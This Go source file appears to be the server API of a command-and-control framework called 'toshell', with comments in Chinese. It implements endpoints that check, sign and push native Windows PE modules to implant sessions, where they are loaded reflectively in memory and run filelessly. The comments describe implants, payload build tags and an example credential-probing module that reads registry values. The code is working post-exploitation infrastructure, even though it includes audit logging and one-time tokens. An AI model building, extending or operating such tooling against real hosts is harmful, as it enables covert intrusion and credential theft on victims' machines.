package api

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"toshell/internal/common/features"
	"toshell/internal/common/moduleabi"
	"toshell/internal/server/builder"
	"toshell/internal/server/logging"
	"toshell/internal/server/modules"
)

// ─── 内存模块按需加载接口（v1.4.0 S4）────────────────────────────────────────
//
// POST /api/v1/sessions/{id}/module  下发并执行一个内存模块
// GET  /api/v1/sessions/{id}/module  列出该会话可用的模块（含可用性判定）
//
// 为什么是**独立端点**而不是"在既有任务体系里加一类任务"：
//   - 下发模块不是"发一条命令"，而是**一次带校验链与一次性凭据的授权动作**：
//     会话活性 → 模块登记 → sha256 硬校验 → 架构/OS → ABI 导出 → 版本握手 →
//     一次性 token → 下发 → 审计。这些判定必须在下发**之前**给出结论，并把
//     "哪一步没过"明确回传；现有的 POST /tasks 只是一个透传通道（它连 task_type
//     都不校验），把 9 步塞进它会污染所有既有调用方对 /tasks 的预期。
//   - 但**交付本身仍然复用既有任务体系**（task.Manager.Create + TaskPusher）：
//     任务表、结果外置与 result_read、task_wait、SSE 事件、分级审批全部照旧可用。
//     所以"接口独立 + 交付复用任务"是贴合现有代码的选择，而不是二选一。
//
// 步骤与错误码一一对应（见 modules/errors.go 的常量表）：
//
//	① 会话存在且 active            → session_not_found / session_inactive
//	② 模块已登记且在 manifest 中    → module_not_registered / module_manifest_invalid
//	③ sha256 与实际字节一致（硬拦） → module_hash_mismatch / module_size_mismatch
//	④ 架构 / OS 匹配（pecheck）     → module_arch_mismatch / module_os_mismatch
//	⑤ 模块 ABI 导出存在 + 非 Go/CLR/TLS → module_abi_exports_missing / module_not_native
//	⑥ 版本握手（ABI 版本一致）      → module_abi_version_mismatch
//	⑦ 一次性 token 有效且未过期/未复用 → token_* 系列
//	⑧ 下发并回传结果（复用任务体系）
//	⑨ 每步都写审计日志 + 机器可读错误码

// moduleExecRequest POST /sessions/{id}/module 请求体。
type moduleExecRequest struct {
	// Module 模块 id（manifest 主键）。
	Module string `json:"module"`
	// Args 传给模块的参数（服务端**不解析**，原样透传给模块；示例模块用
	// "reg:<子键>|<值名>" 紧凑格式，见 implant_c/module/cred_probe.c）。
	Args string `json:"args"`
	// Token 可选：复用/重试同一份一次性凭据。留空 = 本次请求新签发一个。
	//
	// 为什么允许客户端传 token：一次性语义必须能对"重试同一个凭据"给出确定结论
	// （token_reused），而不是靠服务端内部状态不可见地兜住。这既让重放/重试可测，
	// 也让运维能明确区分"这次是新的授权"还是"在重放上一次的授权"。
	Token string `json:"token"`
}

// moduleExecResponse 成功响应（字段只增不改）。
type moduleExecResponse struct {
	OK       bool   `json:"ok"`
	TaskID   uint64 `json:"task_id"`
	TaskType string `json:"task_type"`
	Module   string `json:"module"`
	// Token 已在下发瞬间被核销（一次性），回传只为关联/审计；
	// 再次使用它一定会得到 token_reused。
	Token    string                 `json:"token"`
	SHA256   string                 `json:"sha256"`
	Size     int64                  `json:"size"`
	ABI      uint32                 `json:"abi"`
	Arch     string                 `json:"arch"`
	Exports  []string               `json:"exports"`
	Checks   []moduleCheck          `json:"checks"`
	Audit    map[string]string      `json:"audit"`
	Warnings []string               `json:"warnings,omitempty"`
	Message  string                 `json:"message"`
	PE       *builder.PESummary     `json:"pe_info,omitempty"`
	Extra    map[string]interface{} `json:"extra,omitempty"`
}

// moduleCheck 一步校验的结论（回传给调用方，便于"哪一步没过"一目了然）。
type moduleCheck struct {
	Step   int    `json:"step"`
	Name   string `json:"name"`
	OK     bool   `json:"ok"`
	Detail string `json:"detail,omitempty"`
}

// moduleAuditEvent 一条模块下发审计事件。
//
// 为什么把审计做成"结构化事件 + 可注入 hook"：
//   - 日志（logging）是给人看的，测试里断言字符串太脆；
//   - 审计的价值在于"可判定"：谁在什么时候对哪个会话下发了哪个模块、token 是什么、
//     哪一步被拒。把它做成结构体，既能进日志，也能被单测直接断言字段。
type moduleAuditEvent struct {
	At        time.Time `json:"at"`
	Event     string    `json:"event"`
	SessionID string    `json:"session_id,omitempty"`
	ModuleID  string    `json:"module_id,omitempty"`
	Token     string    `json:"token,omitempty"`
	TaskID    uint64    `json:"task_id,omitempty"`
	Step      int       `json:"step,omitempty"`
	Code      string    `json:"code,omitempty"`
	Detail    string    `json:"detail,omitempty"`
}

// writeModuleError 输出带机器可读 code 的错误（HTTP 状态取自错误对象）。
func writeModuleError(w http.ResponseWriter, err error) {
	status := http.StatusInternalServerError
	code := ""
	msg := err.Error()
	if me, ok := err.(*modules.Error); ok {
		if me.HTTP != 0 {
			status = me.HTTP
		}
		code = me.Code
		msg = me.Message
	}
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":    false,
		"code":  code,
		"error": msg,
	})
}

// auditModule 记录一条模块审计事件（默认写日志；测试可注入 hook 断言）。
func (s *Server) auditModule(ev moduleAuditEvent) {
	if ev.At.IsZero() {
		ev.At = time.Now()
	}
	if s.moduleAuditHook != nil {
		s.moduleAuditHook(ev)
	}
	if ev.Event == "module_exec_ok" || ev.Event == "module_blob_pushed" {
		// 成功路径记 Info：审计需要成功记录（"谁批准了这次下发"），
		// 而 token 只留前 8 位（一次性凭据，不需要在日志里留全量）。
		logging.Info("modules", "audit event=%s session=%s module=%s token=%s task=%d",
			ev.Event, ev.SessionID, ev.ModuleID, shortTokenForLog(ev.Token), ev.TaskID)
		return
	}
	logging.Warn("modules", "audit event=%s session=%s module=%s token=%s step=%d code=%s detail=%s",
		ev.Event, ev.SessionID, ev.ModuleID, shortTokenForLog(ev.Token), ev.Step, ev.Code, ev.Detail)
}

func shortTokenForLog(tok string) string {
	if len(tok) <= 8 {
		return tok
	}
	return tok[:8]
}

// moduleStoreOf 返回模块注册表（懒初始化，便于测试注入）。
func (s *Server) moduleStoreOf() *modules.Store {
	if s.moduleStore == nil {
		s.moduleStore = modules.NewStore("")
	}
	return s.moduleStore
}

// listSessionModulesHandler GET /api/v1/sessions/{id}/module
//
// 列出模块目录里登记的全部模块，并逐个给出"对这个会话能不能用"的判定
// （能力位 / 架构 / ABI）。这是排障入口：操作员不必下发一次才知道哪个模块不匹配。
func (s *Server) listSessionModulesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	id := sessionIDFromPath(r)
	if !s.requireSession(w, id) {
		return
	}
	store := s.moduleStoreOf()
	if err := store.Reload(); err != nil {
		writeModuleError(w, err)
		return
	}
	entries, err := store.List()
	if err != nil {
		writeModuleError(w, err)
		return
	}

	sess, _ := s.sessionMgr.Get(id)
	hostArch, hostOS, capOK := "", "", false
	if sess != nil && sess.Info != nil {
		hostArch, hostOS = sess.Info.Arch, sess.Info.OS
		featureList, _, _ := features.Resolve(sess.Info.ActiveModules, sess.Info.OS)
		for _, f := range featureList {
			if f == features.FeatureExecModule {
				capOK = true
			}
		}
	}

	type item struct {
		modules.Entry
		Usable   bool     `json:"usable"`
		Problems []string `json:"problems,omitempty"`
	}
	out := make([]item, 0, len(entries))
	for _, e := range entries {
		it := item{Entry: e, Usable: true}
		if !capOK {
			it.Usable = false
			it.Problems = append(it.Problems, "会话载荷未上报 exec_module 能力（需要用 -tags execmodule 构建并等待心跳）")
		}
		if err := modules.MatchArch(e.Arch, hostArch); err != nil {
			it.Usable = false
			it.Problems = append(it.Problems, err.Error())
		}
		if err := modules.MatchOS(e.OS, hostOS); err != nil {
			it.Usable = false
			it.Problems = append(it.Problems, err.Error())
		}
		if _, _, err := store.ReadVerified(e.ID); err != nil {
			it.Usable = false
			it.Problems = append(it.Problems, err.Error())
		}
		out = append(out, it)
	}

	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":              true,
		"session_id":      id,
		"dir":             store.Dir(),
		"exec_module":     capOK,
		"host_arch":       hostArch,
		"host_os":         hostOS,
		"abi_version":     moduleabi.Version,
		"abi_token":       moduleabi.TokenPrefix,
		"module_count":    len(out),
		"modules":         out,
		"manifest_loaded": store.LoadError() == nil,
	})
}

// execModuleHandler POST /api/v1/sessions/{id}/module
func (s *Server) execModuleHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		writeModuleError(w, modules.NewError(400, modules.CodeBadRequest, "读取请求体失败：%v", err))
		return
	}
	var req moduleExecRequest
	if err := json.Unmarshal(body, &req); err != nil {
		writeModuleError(w, modules.NewError(400, modules.CodeBadRequest, "请求体不是合法 JSON：%v", err))
		return
	}
	req.Module = strings.TrimSpace(req.Module)
	if req.Module == "" {
		writeModuleError(w, modules.NewError(400, modules.CodeBadRequest, "缺少 module 字段（模块 id，取值见模块清单 manifest.json）"))
		return
	}
	if len(req.Args) > moduleabi.MaxArgsLen {
		writeModuleError(w, modules.NewError(400, modules.CodeBadRequest,
			"args 过长：%d > %d", len(req.Args), moduleabi.MaxArgsLen))
		return
	}

	id := sessionIDFromPath(r)
	checks := make([]moduleCheck, 0, 9)
	ok := func(step int, name, detail string) {
		checks = append(checks, moduleCheck{Step: step, Name: name, OK: true, Detail: detail})
	}
	reject := func(step int, name string, err error) {
		code := modules.ErrorCode(err)
		detail := err.Error()
		checks = append(checks, moduleCheck{Step: step, Name: name, OK: false, Detail: detail})
		s.auditModule(moduleAuditEvent{
			Event: "module_exec_rejected", SessionID: id, ModuleID: req.Module,
			Token: req.Token, Step: step, Code: code, Detail: detail,
		})
		// 把已完成的步骤一并回传：失败时操作员最想知道的是"卡在第几步、前面过了没"。
		writeModuleJSONError(w, err, checks)
	}

	// ── ① 会话存在且 active ───────────────────────────────────────────────
	if s.sessionMgr != nil {
		sess, gerr := s.sessionMgr.Get(id)
		if gerr != nil || sess == nil || sess.Info == nil {
			reject(1, "session_exists", modules.NewError(404, modules.CodeSessionNotFound,
				"会话 %s 不存在（可能已下线并被清理）", id))
			return
		}
		if !strings.EqualFold(sess.Info.Status, "active") && !sess.IsAlive() {
			reject(1, "session_active", modules.NewError(409, modules.CodeSessionInactive,
				"会话 %s 状态为 %q 且已超过判活窗口：模块下发需要一个在线会话（否则二进制会一直挂在队列里）",
				id, sess.Info.Status))
			return
		}
		ok(1, "session_active", fmt.Sprintf("会话在线：status=%s os=%s arch=%s", sess.Info.Status, sess.Info.OS, sess.Info.Arch))
	} else {
		ok(1, "session_active", "未装配会话管理器（精简装配）：跳过活性判定")
	}

	// ── 载荷能力位：载荷必须真的编译了 execmodule ─────────────────────────
	if sess, gerr := s.sessionMgr.Get(id); gerr == nil && sess != nil && sess.Info != nil {
		featureList, _, source := features.Resolve(sess.Info.ActiveModules, sess.Info.OS)
		has := false
		for _, f := range featureList {
			if f == features.FeatureExecModule {
				has = true
				break
			}
		}
		if !has {
			reject(1, "implant_supports_exec_module", modules.NewError(409, modules.CodeImplantUnsupported,
				"该会话的载荷没有 exec_module 能力（能力来源=%s）：需要用 -tags execmodule 重新构建载荷。"+
					"下发到不支持的载荷上只会拿到\"未包含在本次构建中\"，服务端因此直接拒绝", source))
			return
		}
		ok(1, "implant_supports_exec_module", "载荷已上报 exec_module 能力位")
	}

	if !s.requireListener(w) {
		return
	}

	store := s.moduleStoreOf()
	// 每次请求重新读清单：模块可以"服务端更新而不用重编载荷"，重启服务端不是必须的。
	// 清单很小（JSON），读一次的成本远低于"改了模块却没生效"的排查成本。
	if err := store.Reload(); err != nil {
		reject(2, "manifest_load", err)
		return
	}

	// ── ② 模块已登记 ─────────────────────────────────────────────────────
	entry, err := store.Lookup(req.Module)
	if err != nil {
		reject(2, "module_registered", err)
		return
	}
	ok(2, "module_registered", fmt.Sprintf("模块 %s（%s，%d 字节，arch=%s）", entry.ID, entry.File, entry.Size, entry.Arch))

	// ── ③ sha256 / 大小硬校验 ────────────────────────────────────────────
	entry, raw, err := store.ReadVerified(req.Module)
	if err != nil {
		reject(3, "sha256_verified", err)
		return
	}
	ok(3, "sha256_verified", "sha256 与清单一致（哈希不符一律拒绝，没有'警告后继续'）")

	// ── ④ 架构 / OS 匹配（复用 pecheck 的 PE 解析）───────────────────────
	peInfo, perr := builder.InspectPE(raw)
	if perr != nil {
		reject(4, "pe_parsed", modules.NewError(409, modules.CodePEInvalid,
			"模块 %s 不是合法的 Windows PE：%v", entry.ID, perr))
		return
	}
	hostArch, hostOS := "", ""
	if sess, gerr := s.sessionMgr.Get(id); gerr == nil && sess != nil && sess.Info != nil {
		hostArch, hostOS = sess.Info.Arch, sess.Info.OS
	}
	if err := modules.MatchOS(entry.OS, hostOS); err != nil {
		reject(4, "os_match", err)
		return
	}
	if err := modules.MatchOS(peInfoTargetOS(peInfo), hostOS); err != nil {
		reject(4, "os_match", err)
		return
	}
	if err := modules.MatchArch(entry.Arch, hostArch); err != nil {
		reject(4, "arch_match", err)
		return
	}
	// PE 头里的真实架构必须与清单声明一致：清单写错（或被人改过）时，
	// 只比"清单 vs 宿主"会放过一个架构完全不对的镜像（比如 64 位模块登记成 386）。
	if err := modules.MatchArch(peInfo.Machine, entry.Arch); err != nil {
		reject(4, "arch_match", modules.NewError(409, modules.CodeArchMismatch,
			"模块 %s 清单声明 arch=%s，但 PE 头里是 %s：清单与实际文件不一致（拒绝下发，防止下发一个架构不对的镜像崩宿主）",
			entry.ID, entry.Arch, peInfo.Machine))
		return
	}
	ok(4, "arch_match", fmt.Sprintf("模块 %s / 宿主 %s（os=%s）匹配", peInfo.Machine, hostArch, hostOS))

	// ── ⑤ ABI 导出存在 + 非 Go/CLR/TLS ──────────────────────────────────
	exports, eerr := builder.ExportedNames(raw)
	if eerr != nil {
		reject(5, "abi_exports", modules.NewError(409, modules.CodeABIExportsAbsent,
			"模块 %s 的 ABI 导出不可用：%v（内存模块必须导出 %s / %s，见 tsh_module.h）",
			entry.ID, eerr, moduleabi.ExportABI, moduleabi.ExportMain))
		return
	}
	if okExp, missing := builder.HasExports(exports, moduleabi.ExportABI, moduleabi.ExportMain); !okExp {
		reject(5, "abi_exports", modules.NewError(409, modules.CodeABIExportsAbsent,
			"模块 %s 缺少必需导出 %v（现有导出：%v）", entry.ID, missing, exports))
		return
	}
	// 原生代码硬边界：Go 载荷会在同一进程里再起一个 Go runtime（实测崩宿主）；
	// CLR 需要 CLR 宿主；TLS 目录意味着反射映射不会执行的 TLS 回调。
	// 这三条与既有 fileless_exec 预检同一口径（builder.CheckMemoryExec）。
	if isGo, evidence := builder.DetectGoBinary(raw); isGo {
		reject(5, "module_native", modules.NewError(409, modules.CodeNotNative,
			"模块 %s 是 Go 编译产物（%s）：宿主植入端也是 Go，进程内会出现两个 Go runtime 并崩宿主，"+
				"内存模块必须用 C + -nostdlib 构建", entry.ID, evidence))
		return
	}
	if peInfo.HasCLRDir {
		reject(5, "module_native", modules.NewError(409, modules.CodeNotNative,
			"模块 %s 带 CLR 目录（.NET 程序集）：进程内没有 CLR 宿主，反射加载必然失败", entry.ID))
		return
	}
	if peInfo.HasTLSDir {
		reject(5, "module_native", modules.NewError(409, modules.CodeNotNative,
			"模块 %s 带 TLS 目录：反射映射不会执行 TLS 回调，模块可能读到未初始化状态（拒绝下发）", entry.ID))
		return
	}
	ok(5, "abi_exports", fmt.Sprintf("导出齐全：%v；非 Go/CLR/TLS 的原生 PE", exports))

	// ── ⑥ 版本握手（服务端侧）────────────────────────────────────────────
	if entry.ABI != moduleabi.Version {
		reject(6, "abi_version", modules.NewError(409, modules.CodeABIMismatch,
			"模块 %s 声明 ABI %d，本服务端要求 %d（%s）", entry.ID, entry.ABI, moduleabi.Version, moduleabi.TokenPrefix))
		return
	}
	header := &moduleabi.ArgumentHeader{
		ModuleID: entry.ID,
		SHA256:   entry.SHA256,
		Size:     int(entry.Size),
		ABI:      entry.ABI,
		Entry:    firstNonEmptyStr(entry.Entry, moduleabi.ExportMain),
		ArgsJSON: req.Args,
	}
	ok(6, "abi_version", fmt.Sprintf("ABI %d == 服务端 %d（植入端还会调 tsh_module_abi() 再握一次手）",
		entry.ABI, moduleabi.Version))

	// ── ⑦ 一次性 token：签发/复用 + 核销 ─────────────────────────────────
	var token *modules.Token
	if req.Token == "" {
		token, err = store.IssueTokenFor(id, entry)
		if err != nil {
			reject(7, "token_issue", err)
			return
		}
		header.Token = token.Value
		// 立刻核销：本次下发就是这次授权的唯一一次使用。核销失败（理论上不会）
		// 也按拒绝处理 —— 宁可让操作员重来一次，也不留下一个可被重放的凭据。
		if _, cerr := store.ConsumeToken(token.Value, id, entry.ID); cerr != nil {
			reject(7, "token_consume", cerr)
			return
		}
		ok(7, "token_one_shot", fmt.Sprintf("已签发并核销一次性 token %s…（有效期 %s）", shortTokenForLog(token.Value), modules.DefaultTokenTTL))
	} else {
		// 复用/重试同一凭据：只有"未用过且未过期且属于这个会话/模块"才放行。
		header.Token = req.Token
		token, err = store.ConsumeToken(req.Token, id, entry.ID)
		if err != nil {
			reject(7, "token_consume", err)
			return
		}
		ok(7, "token_one_shot", fmt.Sprintf("复用客户端提供的 token %s…（本轮核销，下一次必被拒）", shortTokenForLog(token.Value)))
	}

	// 任务数据：只有 token 与元信息，**没有模块字节**。
	taskData, _ := json.Marshal(header)

	// ── ⑧ 下发：先推二进制帧，再推任务 ───────────────────────────────────
	frame, err := moduleabi.EncodeBlobFrame(&moduleabi.ArgumentHeader{
		ModuleID: entry.ID, Token: header.Token, SHA256: entry.SHA256,
		Size: int(entry.Size), ABI: entry.ABI,
	}, raw)
	if err != nil {
		reject(8, "blob_frame", modules.NewError(500, modules.CodeTooLarge,
			"打包模块二进制帧失败：%v", err))
		return
	}
	// 顺序很重要：TCP/WS 下两个帧按 FIFO 到达，二进制先到 = 任务执行时必然已暂存；
	// 植入端另有"等待二进制"的兜底（waitModuleBlob），但先推字节能让常态路径零等待。
	if err := s.listener.PushModuleBlob(id, header.Token, frame); err != nil {
		reject(8, "blob_push", modules.NewError(503, modules.CodePushFailed,
			"模块二进制下发失败：%v（token 已核销，如需重试请重新发起下发，不复用旧 token）", err))
		return
	}
	s.auditModule(moduleAuditEvent{
		Event: "module_blob_pushed", SessionID: id, ModuleID: entry.ID,
		Token: header.Token, Detail: fmt.Sprintf("size=%d sha256=%s", entry.Size, entry.SHA256[:12]),
	})

	taskInfo, err := s.taskMgr.CreateExecModule(id, string(taskData))
	if err != nil {
		reject(8, "task_create", modules.NewError(500, modules.CodeTaskCreateErr,
			"创建 exec_module 任务失败：%v", err))
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		reject(8, "task_push", modules.NewError(503, modules.CodePushFailed,
			"exec_module 任务下发失败：%v", err))
		return
	}
	ok(8, "dispatched", fmt.Sprintf("二进制帧 + 任务 %d 已下发（结果走既有任务结果通道，可用 result_read 回读长输出）", taskInfo.ID))

	// ── ⑨ 审计 ───────────────────────────────────────────────────────────
	s.auditModule(moduleAuditEvent{
		Event: "module_exec_ok", SessionID: id, ModuleID: entry.ID,
		Token: header.Token, TaskID: taskInfo.ID,
		Detail: fmt.Sprintf("size=%d abi=%d arch=%s", entry.Size, entry.ABI, entry.Arch),
	})
	ok(9, "audited", "已写审计日志（事件=module_exec_ok）")

	summary := peInfo.Summary(false)
	resp := moduleExecResponse{
		OK: true, TaskID: taskInfo.ID, TaskType: taskInfo.TaskType, Module: entry.ID,
		Token: header.Token, SHA256: entry.SHA256, Size: entry.Size, ABI: entry.ABI,
		Arch: entry.Arch, Exports: exports, Checks: checks,
		Audit: map[string]string{
			"event": "module_exec_ok", "session_id": id, "module_id": entry.ID,
			"token_prefix": shortTokenForLog(header.Token),
		},
		PE:      &summary,
		Message: "模块已下发：植入端会做「按 token 取出 → 反射映射 → ABI 版本握手 → 执行 → 清零释放」，结果经任务结果通道回传",
	}
	_ = json.NewEncoder(w).Encode(resp)
}

// writeModuleJSONError 输出失败响应（含已完成的步骤清单）。
func writeModuleJSONError(w http.ResponseWriter, err error, checks []moduleCheck) {
	status := http.StatusInternalServerError
	code, msg := "", err.Error()
	if me, ok := err.(*modules.Error); ok {
		if me.HTTP != 0 {
			status = me.HTTP
		}
		code, msg = me.Code, me.Message
	}
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":     false,
		"code":   code,
		"error":  msg,
		"checks": checks,
	})
}

// peInfoTargetOS 从 PE 头推导目标 OS。当前只支持 Windows：PE 的 Subsystem 值域
// 与 OS 无关，所以这里恒返回 "windows" —— 但仍做成函数，避免以后支持 ELF 时
// 有人误以为"PE 就是 Windows"这件事没有检查点。
func peInfoTargetOS(info *builder.PEInfo) string {
	if info == nil {
		return ""
	}
	return "windows"
}

func firstNonEmptyStr(a, b string) string {
	if strings.TrimSpace(a) != "" {
		return a
	}
	return b
}
